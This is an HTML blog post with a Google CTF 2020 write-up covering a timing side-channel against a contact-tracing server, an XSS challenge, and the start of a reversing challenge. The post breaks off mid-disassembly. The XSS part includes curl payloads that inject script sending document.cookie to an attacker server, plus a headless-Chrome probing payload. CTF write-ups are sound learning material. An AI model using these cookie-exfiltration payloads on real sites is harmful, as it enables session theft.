@@ -1,0 +1,829 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>Google CTF 2020 Writeup</title>
+		<meta name="description" content="I am writing about my experiences as a naval navel-gazer.">
+		<link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ">
+		<link rel="alternate" href="/feed/feed.json" type="application/json" title="ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ">
+		
+		<style>/**
+ * okaidia theme for JavaScript, CSS and HTML
+ * Loosely based on Monokai textmate theme by http://www.monokai.nl/
+ * @author ocodia
+ */
+
+code[class*="language-"],
+pre[class*="language-"] {
+	color: #f8f8f2;
+	background: none;
+	text-shadow: 0 1px rgba(0, 0, 0, 0.3);
+	font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+	font-size: 1em;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+	word-wrap: normal;
+	line-height: 1.5;
+
+	-moz-tab-size: 4;
+	-o-tab-size: 4;
+	tab-size: 4;
+
+	-webkit-hyphens: none;
+	-moz-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+	padding: 1em;
+	margin: .5em 0;
+	overflow: auto;
+	border-radius: 0.3em;
+}
+
+:not(pre) > code[class*="language-"],
+pre[class*="language-"] {
+	background: #272822;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+	padding: .1em;
+	border-radius: .3em;
+	white-space: normal;
+}
+
+.token.comment,
+.token.prolog,
+.token.doctype,
+.token.cdata {
+	color: #8292a2;
+}
+
+.token.punctuation {
+	color: #f8f8f2;
+}
+
+.token.namespace {
+	opacity: .7;
+}
+
+.token.property,
+.token.tag,
+.token.constant,
+.token.symbol,
+.token.deleted {
+	color: #f92672;
+}
+
+.token.boolean,
+.token.number {
+	color: #ae81ff;
+}
+
+.token.selector,
+.token.attr-name,
+.token.string,
+.token.char,
+.token.builtin,
+.token.inserted {
+	color: #a6e22e;
+}
+
+.token.operator,
+.token.entity,
+.token.url,
+.language-css .token.string,
+.style .token.string,
+.token.variable {
+	color: #f8f8f2;
+}
+
+.token.atrule,
+.token.attr-value,
+.token.function,
+.token.class-name {
+	color: #e6db74;
+}
+
+.token.keyword {
+	color: #66d9ef;
+}
+
+.token.regex,
+.token.important {
+	color: #fd971f;
+}
+
+.token.important,
+.token.bold {
+	font-weight: bold;
+}
+.token.italic {
+	font-style: italic;
+}
+
+.token.entity {
+	cursor: help;
+}
+/*
+ * New diff- syntax
+ */
+
+pre[class*="language-diff-"] {
+	--eleventy-code-padding: 1.25em;
+	padding-left: var(--eleventy-code-padding);
+	padding-right: var(--eleventy-code-padding);
+}
+.token.deleted {
+	background-color: hsl(0, 51%, 37%);
+	color: inherit;
+}
+.token.inserted {
+	background-color: hsl(126, 31%, 39%);
+	color: inherit;
+}
+
+/* Make the + and - characters unselectable for copy/paste */
+.token.prefix.unchanged,
+.token.prefix.inserted,
+.token.prefix.deleted {
+	-webkit-user-select: none;
+	user-select: none;
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	padding-top: 2px;
+	padding-bottom: 2px;
+}
+.token.prefix.inserted,
+.token.prefix.deleted {
+	width: var(--eleventy-code-padding);
+	background-color: rgba(0,0,0,.2);
+}
+
+/* Optional: full-width background color */
+.token.inserted:not(.prefix),
+.token.deleted:not(.prefix) {
+	display: block;
+	margin-left: calc(-1 * var(--eleventy-code-padding));
+	margin-right: calc(-1 * var(--eleventy-code-padding));
+	text-decoration: none; /* override del, ins, mark defaults */
+	color: inherit; /* override del, ins, mark defaults */
+}
+* { box-sizing: border-box; }
+/* Defaults */
+:root {
+	--font-family: -apple-system, system-ui, sans-serif;
+	--font-family-monospace: Consolas, Menlo, Monaco, Andale Mono WT, Andale Mono, Lucida Console, Lucida Sans Typewriter, DejaVu Sans Mono, Bitstream Vera Sans Mono, Liberation Mono, Nimbus Mono L, Courier New, Courier, monospace;
+}
+
+/* Theme colors */
+:root {
+	--color-gray-20: #e0e0e0;
+	--color-gray-50: #C0C0C0;
+	--color-gray-90: #333;
+
+	--background-color: #fff;
+
+	--text-color: var(--color-gray-90);
+	--text-color-link: #082840;
+	--text-color-link-active: #5f2b48;
+	--text-color-link-visited: #17050F;
+
+	--syntax-tab-size: 2;
+
+	--pinyin-font: 'Arima Madurai';
+}
+
+@media (prefers-color-scheme: dark) {
+	:root {
+		--color-gray-20: #e0e0e0;
+		--color-gray-50: #C0C0C0;
+		--color-gray-90: #dad8d8;
+
+		/* --text-color is assigned to --color-gray-_ above */
+		--text-color-link: #1493fb;
+		--text-color-link-active: #6969f7;
+		--text-color-link-visited: #a6a6f8;
+
+		--background-color: #15202b;
+	}
+}
+
+
+/* Global stylesheet */
+* {
+	box-sizing: border-box;
+}
+
+html,
+body {
+	padding: 0;
+	margin: 0 auto;
+	font-family: var(--font-family);
+	color: var(--text-color);
+	background-color: var(--background-color);
+}
+html {
+	overflow-y: scroll;
+}
+body {
+	max-width: 55em;
+}
+
+/* https://www.a11yproject.com/posts/how-to-hide-content/ */
+.visually-hidden {
+	clip: rect(0 0 0 0);
+	clip-path: inset(50%);
+	height: 1px;
+	overflow: hidden;
+	position: absolute;
+	white-space: nowrap;
+	width: 1px;
+}
+
+p:last-child {
+	margin-bottom: 0;
+}
+p {
+	line-height: 1.5;
+}
+
+li {
+	line-height: 1.5;
+}
+
+a[href] {
+	color: var(--text-color-link);
+}
+a[href]:visited {
+	color: var(--text-color-link-visited);
+}
+a[href]:hover,
+a[href]:active {
+	color: var(--text-color-link-active);
+}
+
+main {
+	padding: 1rem;
+}
+main :first-child {
+	margin-top: 0;
+}
+
+header {
+	border-bottom: 1px dashed var(--color-gray-20);
+}
+header:after {
+	content: "";
+	display: table;
+	clear: both;
+}
+
+.links-nextprev {
+	list-style: none;
+	border-top: 1px dashed var(--color-gray-20);
+	padding: 1em 0;
+}
+
+table {
+	margin: 1em 0;
+}
+table td,
+table th {
+	padding-right: 1em;
+}
+
+pre,
+code {
+	font-family: var(--font-family-monospace);
+}
+pre:not([class*="language-"]) {
+	margin: .5em 0;
+	line-height: 1.375; /* 22px /16 */
+	-moz-tab-size: var(--syntax-tab-size);
+	-o-tab-size: var(--syntax-tab-size);
+	tab-size: var(--syntax-tab-size);
+	-webkit-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+	direction: ltr;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+}
+code {
+	word-break: break-all;
+}
+p > code {
+	color: #722;
+	text-decoration: underline #7222;
+}
+
+/* Header */
+header {
+	display: flex;
+	gap: 1em .5em;
+	flex-wrap: wrap;
+	align-items: center;
+	padding: 1em;
+}
+.home-link {
+	font-size: 1em; /* 16px /16 */
+	font-weight: 700;
+	margin-right: 2em;
+}
+.home-link:link:not(:hover) {
+	text-decoration: none;
+}
+
+/* Nav */
+.nav {
+	display: flex;
+	padding: 0;
+	margin: 0;
+	list-style: none;
+}
+.nav-item {
+	display: inline-block;
+	margin-right: 1em;
+}
+.nav-item a[href]:not(:hover) {
+	text-decoration: none;
+}
+.nav a[href][aria-current="page"] {
+	text-decoration: underline;
+}
+
+/* Posts list */
+.postlist {
+	list-style: none;
+	padding: 0;
+	padding-left: 1.5rem;
+}
+.postlist-item {
+	display: flex;
+	flex-wrap: wrap;
+	align-items: baseline;
+	counter-increment: start-from -1;
+	margin-bottom: 1em;
+}
+.postlist-item:before {
+	display: inline-block;
+	pointer-events: none;
+	content: "" counter(start-from, decimal-leading-zero) ". ";
+	line-height: 100%;
+	text-align: right;
+	margin-left: -1.5rem;
+}
+.postlist-date,
+.postlist-item:before {
+	font-size: 0.8125em; /* 13px /16 */
+	color: var(--color-gray-90);
+}
+.postlist-date {
+	word-spacing: -0.5px;
+}
+.postlist-link {
+	font-size: 1.1875em; /* 19px /16 */
+	font-weight: 700;
+	flex-basis: calc(100% - 1.5rem);
+	padding-left: .25em;
+	padding-right: .5em;
+	text-underline-position: from-font;
+	text-underline-offset: 0;
+	text-decoration-thickness: 1px;
+}
+.postlist-item-active .postlist-link {
+	font-weight: bold;
+}
+
+/* Tags */
+.post-tag {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	text-transform: capitalize;
+	font-style: italic;
+}
+.postlist-item > .post-tag {
+	align-self: center;
+}
+
+/* Tags list */
+.post-metadata {
+	display: inline-flex;
+	flex-wrap: wrap;
+	gap: .5em;
+	list-style: none;
+	padding: 0;
+	margin: 0;
+}
+.post-metadata time {
+	margin-right: 1em;
+}
+
+/* Direct Links / Markdown Headers */
+.header-anchor {
+	text-decoration: none;
+	font-style: normal;
+	font-size: 1em;
+	margin-left: .1em;
+}
+a[href].header-anchor,
+a[href].header-anchor:visited {
+	color: transparent;
+}
+a[href].header-anchor:focus,
+a[href].header-anchor:hover {
+	text-decoration: underline;
+}
+a[href].header-anchor:focus,
+:hover > a[href].header-anchor {
+	color: #aaa;
+}
+
+h2 + .header-anchor {
+	font-size: 1.5em;
+}
+
+.pyin {
+	font-family: var(--pinyin-font), cursive;
+}
+
+figure {
+	margin: -1.7em 0 0.7em 0;
+}
+
+figcaption {
+	font-style: italic;
+}
+
+figure img {
+	border: 1px solid #ccc;
+}</style>
+		<link href="https://fonts.googleapis.com/css2?family=Arima+Madurai:wght@400;700" rel="stylesheet" referrerpolicy="no-referrer">
+	</head>
+	<body>
+		<a href="#skip" class="visually-hidden">Skip to main content</a>
+
+		<header>
+			<a href="/" class="home-link">ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ</a>
+			<nav>
+				<h2 class="visually-hidden">Top level navigation menu</h2>
+				<ul class="nav">
+					<li class="nav-item"><a href="/">Home</a></li>
+					<li class="nav-item"><a href="/blog/">Archive</a></li>
+					<li class="nav-item"><a href="/about/">About Me</a></li>
+				</ul>
+			</nav>
+		</header>
+
+		<main id="skip">
+			
+<h1>Google CTF 2020 Writeup</h1>
+
+<ul class="post-metadata">
+	<li><time datetime="2020-08-24">2020年08月</time></li>
+	<li><a href="/tags/security/" class="post-tag">security</a>, </li>
+	<li><a href="/tags/ctf/" class="post-tag">ctf</a></li>
+</ul>
+
+<p>The Google CTF was hard, so I don't feel so bad about only solving easy challenges. Writeup also <a href="https://gist.github.com/bcaller/72c860e6046ff9a287ae8364aaff21d8">available as a Gist</a>.</p>
+<h1 id="tracing" tabindex="-1">Tracing <a class="header-anchor" href="#tracing">#</a></h1>
+<p>Type: pwn, Points: 151, Solves: 79</p>
+<h2 id="intro" tabindex="-1">Intro <a class="header-anchor" href="#intro">#</a></h2>
+<p>The challenge is a contract tracing system.
+The server plays the part of the contract tracing app which keeps a record of all IDs it has come into
+contact with.
+The IDs are 16 byte strings represented as UUIDs.
+It listens on a TCP socket for connections from the health authority, which sends lists of infected IDs.
+The server then checks whether any IDs it has recorded are infected.</p>
+<p>The challenge is to force the server to disclose its IDs - one in particular will be the flag <code>CTF{???????????}</code>.
+Since it never transmits the IDs, we need to use a side-channel attack to disclose the flag.</p>
+<h2 id="getting-output-from-the-server" tabindex="-1">Getting output from the server <a class="header-anchor" href="#getting-output-from-the-server">#</a></h2>
+<p>The first problem when connecting is that there's no response from the server, whatever you send to it.</p>
+<pre><code>rlwrap nc tracing.2020.ctfcompetition.com 1337
+</code></pre>
+<p>Luckily, the challenge rust code builds easily with <code>cargo build</code>, so you can run it and see the debug messages.
+Unfortunately, I still couldn't reach the line <code>debug!(&quot;Received {} IDs&quot;, count);</code> until I found out that you can hangup
+just one side of a TCP connection.
+You can shutdown just the client-&gt;server side, and still receive data back from the server.
+In python you can use <code>sock.shutdown(socket.SHUT_WR)</code> and this makes the server continue past the <code>await</code>.</p>
+<h2 id="comparison" tabindex="-1">Comparison <a class="header-anchor" href="#comparison">#</a></h2>
+<p>When sent a list of IDs via the TCP socket, the server first builds a binary search tree (BST).
+For each ID the server has recorded, it searches for it within the BST.</p>
+<h3 id="bst" tabindex="-1">BST <a class="header-anchor" href="#bst">#</a></h3>
+<p>Let's imagine the IDs are single bytes rather than 16 bytes.
+If the server receives infected IDs 25,20,30,15,27,23,55,41,67,29,24,21,10,17,26 you will end up with this beautiful balanced BST:</p>
+<pre><code>                 25
+          ______/  \______
+         /                \
+        20                30
+     /     \          /       \
+   15       23       27       55
+  /  \     /  \     /  \     /  \
+ 10  17   21  24   26  29   41  67
+</code></pre>
+<p>If the server wants to check whether 28 exists within the BST, it walks down from the root.</p>
+<ul>
+<li>28 &gt; 25 (right)</li>
+<li>28 &lt; 30 (left)</li>
+<li>28 &gt; 27 (right)</li>
+<li>28 &lt; 29 (left, not found)</li>
+</ul>
+<p>For a balanced binary search tree the lookup takes time <code>O(log(n))</code>. However, the server builds a binary search tree which isn't necessarily
+balanced. The resulting tree depends on the order which the IDs are received.</p>
+<p>If the IDs are received in the order 10,15,17,20,21,23,24,25,26,27,29,30,41,55,67 then the BST will be super unbalanced:</p>
+<pre><code>10
+ \
+  15
+   \
+    17
+     \
+      20
+      ...
+</code></pre>
+<p>A lookup for 8 will only require comparison with the root (8 &lt; 10) since there's nothing on the left.</p>
+<p>A lookup for 70, will require comparisons with each item of the tree (70 &gt; 10, 70 &gt; 15, 70 &gt; 17) giving the worst case
+lookup of <code>O(n)</code>.</p>
+<h2 id="leaking-ids" tabindex="-1">Leaking IDs <a class="header-anchor" href="#leaking-ids">#</a></h2>
+<p>Since we, playing the role of the evil health authority, control the infected IDs sent to the server, we control the shape of the BST.
+By forcing a very unbalanced BST, the lookup takes much longer if the ID is on one side of the root node than the other.</p>
+<p>If we guess a possible alphabet of <code>!#$+-0123456789:&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ^_abcdefghijklmnopqrstuvwxyz</code>, then
+to determine the character after <code>CTF{</code> we start in the middle with letter Q: bisection method.</p>
+<p>Send the root <code>CTF{Q!!!!!!!!!!}</code> followed by 7000 IDs as far to the right as possible to produce a tree like:</p>
+<pre><code>CTF{Q!!!!!!!!!!}
+                 CTF{zzzzzzzzzzz}
+              CTF{zzzzzzzzzzy}
+           CTF{zzzzzzzzzzx}
+        CTF{zzzzzzzzzzw}
+     CTF{zzzzzzzzzzv}
+  CTF{zzzzzzzzzzu}
+  ...
+</code></pre>
+<p>Then shutdown the write side of the connection and time the duration until the server closes the connection.</p>
+<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> suffix<span class="token punctuation">,</span> n<span class="token punctuation">,</span> increase<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">16</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> n<span class="token punctuation">,</span> increase<span class="token punctuation">)</span>
+    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'tracing.2020.ctfcompetition.com'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>root<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    attempts <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">for</span> attempt <span class="token keyword">in</span> attempts<span class="token punctuation">:</span>
+        sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>attempt<span class="token punctuation">)</span>
+    sock<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SHUT_WR<span class="token punctuation">)</span>
+    data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time_ns<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">while</span> data<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time_ns<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    timing <span class="token operator">=</span> end <span class="token operator">-</span> start
+    <span class="token keyword">print</span><span class="token punctuation">(</span>timing<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> timing</code></pre>
+<p>If the flag is anywhere to the right of the root, the server will have to search all the way through the 7000 IDs.
+If the flag is anywhere to the left of the root, the lookup will complete after just one comparison with the root.</p>
+<p>Then make the BST weighted to the left and compare the timings. If the right-weighted tree lookup took much longer, the
+first character of the flag is between <code>Q</code> and <code>z</code>: we set the midpoint to <code>h</code>.</p>
+<p>At some point later we have determined that the flag starts <code>CTF{1Bi</code> and that the next character is within <code>qrstuvwxy</code>.
+We send a right-weighted tree and it responds in 0.02ms.</p>
+<pre><code>CTF{1Biu!!!!!!!}
+                 CTF{1Bi y zzzzzzz}
+              CTF{1Bi y zzzzzzy}
+           CTF{1Bi y zzzzzzx}
+        CTF{1Bi y zzzzzzw}
+     CTF{1Bi y zzzzzzv}
+  CTF{1Bi y zzzzzzu}
+</code></pre>
+<p>And the left-weighted tree responds in 88.6ms.</p>
+<pre><code>                 CTF{1Biuzzzzzzz}
+CTF{1Biq!!!!!!!}
+   CTF{1Biq!!!!!!#}
+      CTF{1Biq!!!!!!$}
+         CTF{1Biq!!!!!!+}
+            CTF{1Biq!!!!!!-}
+               CTF{1Biq!!!!!!0}
+</code></pre>
+<p>So we guess that the character after <code>CTF{1Bi</code> is within <code>qrstu</code> (to the left).</p>
+<p>There were some issues with getting accurate timings, especially when the midpoint was the correct letter, but with a
+bit of messing around we get the flag <code>CTF{1BitAtATime}</code>.</p>
+<p>This was a fun challenge that just requires a little computer science.</p>
+<h1 id="pasteurize" tabindex="-1">Pasteurize <a class="header-anchor" href="#pasteurize">#</a></h1>
+<p>Type: web, Points: 50, Solves: 260</p>
+<p>Let's investigate the source code.</p>
+<h2 id="source-code" tabindex="-1">Source code <a class="header-anchor" href="#source-code">#</a></h2>
+<h3 id="body-parser" tabindex="-1">Body parser <a class="header-anchor" href="#body-parser">#</a></h3>
+<pre class="language-js" tabindex="0"><code class="language-js"><span class="token comment">/* They say reCAPTCHA needs those. But does it? */</span>
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+  <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>Extended body parser allows sending arrays and objects as form params.
+You can send <code>a=1&amp;a=2</code> which makes <code>req.body.a = [&quot;1&quot;, &quot;2&quot;]</code> (of type array instead of string as usual).</p>
+<h3 id="xss-in-get-note" tabindex="-1">XSS in GET note <a class="header-anchor" href="#xss-in-get-note">#</a></h3>
+<pre class="language-js" tabindex="0"><code class="language-js"><span class="token comment">/* Make sure to properly escape the note! */</span>
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/:id([a-f0-9\-]{36})'</span><span class="token punctuation">,</span> recaptcha<span class="token punctuation">.</span>middleware<span class="token punctuation">.</span>render<span class="token punctuation">,</span> utils<span class="token punctuation">.</span>cache_mw<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">const</span> note_id <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">;</span>
+  <span class="token keyword">const</span> note <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">get_note</span><span class="token punctuation">(</span>note_id<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>note <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Paste not found or access has been denied."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">const</span> unsafe_content <span class="token operator">=</span> note<span class="token punctuation">.</span>content<span class="token punctuation">;</span>
+  <span class="token keyword">const</span> safe_content <span class="token operator">=</span> <span class="token function">escape_string</span><span class="token punctuation">(</span>unsafe_content<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/***************************/</span>
+
+  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'note_public'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+    <span class="token literal-property property">content</span><span class="token operator">:</span> safe_content<span class="token punctuation">,</span>
+    <span class="token literal-property property">id</span><span class="token operator">:</span> note_id<span class="token punctuation">,</span>
+    <span class="token literal-property property">captcha</span><span class="token operator">:</span> res<span class="token punctuation">.</span>recaptcha
+  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>Let's look at the critical <code>escape_string</code> method:</p>
+<pre class="language-js" tabindex="0"><code class="language-js"><span class="token comment">/* Who wants a slice? */</span>
+<span class="token keyword">const</span> <span class="token function-variable function">escape_string</span> <span class="token operator">=</span> <span class="token parameter">unsafe</span> <span class="token operator">=></span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+  <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\x3C'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">></span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\x3E'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>How does it work with strings?</p>
+<pre><code>escape_string('abc')
+'abc'
+escape_string('a&quot;b&quot;c')
+'a\\&quot;b\\&quot;c'
+</code></pre>
+<p>But because of extended bodyparser we can send arrays:</p>
+<pre><code>escape_string([])
+''
+escape_string(['a', 'b'])
+'&quot;a&quot;,&quot;b&quot;'
+escape_string([';//'])
+'&quot;;//&quot;'
+</code></pre>
+<h2 id="solution" tabindex="-1">Solution <a class="header-anchor" href="#solution">#</a></h2>
+<p>The output of <code>escape_string</code> ends up being served within javascript surrounded by double quotes. We can break out of the double quotes by sending an array request such as:</p>
+<pre class="language-bash" tabindex="0"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-L</span> https://pasteurize.web.ctfcompetition.com/ <span class="token punctuation">\</span>
+  <span class="token parameter variable">--data</span> <span class="token string">"content=;function aa(d) { const e = btoa(JSON.stringify(d)); return fetch(\<span class="token variable"><span class="token variable">`</span>https://myserver/<span class="token punctuation">\</span><span class="token variable">`</span></span>) } aa(document.cookie);//&amp;content=x"</span></code></pre>
+<p>The note contains html:</p>
+<pre class="language-html" tabindex="0"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+        <span class="token keyword">const</span> note <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">aa</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">const</span> e <span class="token operator">=</span> <span class="token function">btoa</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://myserver/</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token function">aa</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//","x"";</span>
+        <span class="token keyword">const</span> note_id <span class="token operator">=</span> <span class="token string">"dc8ec4b1-0c03-4887-9e9e-b4d580759138"</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> note_el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'note-content'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> note_url_el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'note-title'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> clean <span class="token operator">=</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        note_el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> clean<span class="token punctuation">;</span>
+        note_url_el<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>note_id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+        note_url_el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>note_id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
+<p>Now we just share the note with TJMike🎤 and wait for his headless Chrome to report the base64-encoded cookie with flag back to your server.</p>
+<h2 id="extra" tabindex="-1">Extra <a class="header-anchor" href="#extra">#</a></h2>
+<p>I also tried to exploit the headless Chrome with <a href="https://github.com/bcaller/puppet-puncher">puppet-puncher</a> with payload</p>
+<pre><code>content=;var ok=0;function zzq(){if(ok){return;} ok=1; function aa(d) { const e = btoa(JSON.stringify(d)); return fetch(`https://myserver/?x=${e}`) } function rs(k, s) { aa([k, s]) } Object.keys(window).filter(function(k){return typeof window[k] == 'function'}).filter(function(k){return k.indexOf('zzq') == -1}).filter(function(k){return window[k].toString().indexOf('[bindingName]') != -1}).forEach(function(k){ const f = window[k];try{f({'toString': null, '__proto__': null}).then(function(){return f()}).then(function(f){return f([-1.3e99, 'n', null], 'hi', {'toString': null})}).then(function(r){return aa([k, r])}).catch(function(e){return rs(k, e.stack)})}catch(ee){}});aa(document.cookie)};window.onload=zzq;//&amp;content=x
+</code></pre>
+<p>but no exposed functions were found.</p>
+<h1 id="beginner" tabindex="-1">Beginner <a class="header-anchor" href="#beginner">#</a></h1>
+<p>Type: reversing, Points: 50, Solves: 482</p>
+<h2 id="intro-1" tabindex="-1">Intro <a class="header-anchor" href="#intro-1">#</a></h2>
+<p>This binary verifies if a flag is correct or not. The flag isn't inside the binary: instead you have to understand how the verification works and reverse it to make a flag which outputs <code>SUCCESS</code> instead of <code>FAILURE</code>.</p>
+<h2 id="disassembly" tabindex="-1">Disassembly <a class="header-anchor" href="#disassembly">#</a></h2>
+<p>Load it into <code>gdb</code> and <code>disas main</code>:</p>
+<pre><code>Dump of assembler code for function main:
+   0x0000000000001080 &lt;+0&gt;:     push   r12
+   0x0000000000001082 &lt;+2&gt;:     lea    rdi,[rip+0xf7b]        # 0x2004
+   0x0000000000001089 &lt;+9&gt;:     xor    eax,eax
+   0x000000000000108b &lt;+11&gt;:    push   rbp
+   0x000000000000108c &lt;+12&gt;:    sub    rsp,0x28
+   0x0000000000001090 &lt;+16&gt;:    call   0x1050 &lt;printf@plt&gt;
+   0x0000000000001095 &lt;+21&gt;:    mov    r12,rsp
+   0x0000000000001098 &lt;+24&gt;:    xor    eax,eax
